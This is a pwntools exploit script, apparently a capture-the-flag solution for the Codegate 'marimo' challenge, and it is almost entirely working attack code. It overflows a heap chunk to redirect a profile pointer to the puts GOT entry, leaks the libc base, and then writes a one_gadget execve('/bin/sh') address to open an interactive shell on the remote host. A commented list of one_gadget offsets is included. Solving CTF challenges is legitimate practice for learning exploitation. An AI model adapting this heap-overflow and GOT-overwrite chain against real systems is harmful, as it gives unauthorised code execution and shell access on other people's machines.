from pwn import *
import sys, time
import ctypes
LIBC = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
binary = ELF("./marimo")
#context.log_level = "debug"

if len(sys.argv) == 1:
    p = process(["./marimo"])
    pause()

else:
    p = remote("ch41l3ng3s.codegate.kr", "3333")

def secret_mario(name, profile):
    p.recvuntil(">> ")
    p.sendline("show me the marimo")
    p.recvuntil("name?")
    p.sendline(name)
    p.recvuntil("profile.")
    p.sendline(profile)

def sell(index):
    p.recvuntil(">> ")
    p.sendline("S")
    p.recvuntil(">> ")
    p.sendline(str(index))

def view(index):
    p.recvuntil(">> ")
    p.sendline("V")
    p.recvuntil(">> ")
    p.sendline(str(index))


# index 8
secret_mario("A" * 16, "a" * 0x20)
secret_mario("B" * 16, "b" * 0x20)
secret_mario("C" * 16, "c" * 0x20)
secret_mario("D" * 16, "d" * 0x20)

log.info("wait 5 seconds")
time.sleep(5)

log.info("overwrite next chunk's profile")
view(0)
p.recvuntil("[B]ack ?")
p.sendline("M")
p.recvuntil("profile")
p.sendline("a" * 0x20 + p64(0) + p64(0x31) + p64(binary.got["puts"]) * 3)     # overwrite chunk_array[1]'s profile
p.recvuntil("[B]ack ?")
p.sendline("B")
view(1)
p.recvuntil("name : ")
libc_base = u64(p.recv(6).ljust(8, "\x00")) - 0x6f690
system = libc_base + 0x045390
binsh = libc_base + 0x18cd57
log.info("libc_base : "+ hex(libc_base))
p.sendline("M")

'''
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf0274	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1117	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
p.recvuntil("profile")
p.sendline(p64(libc_base + 0x45216) * 4)

p.interactive()
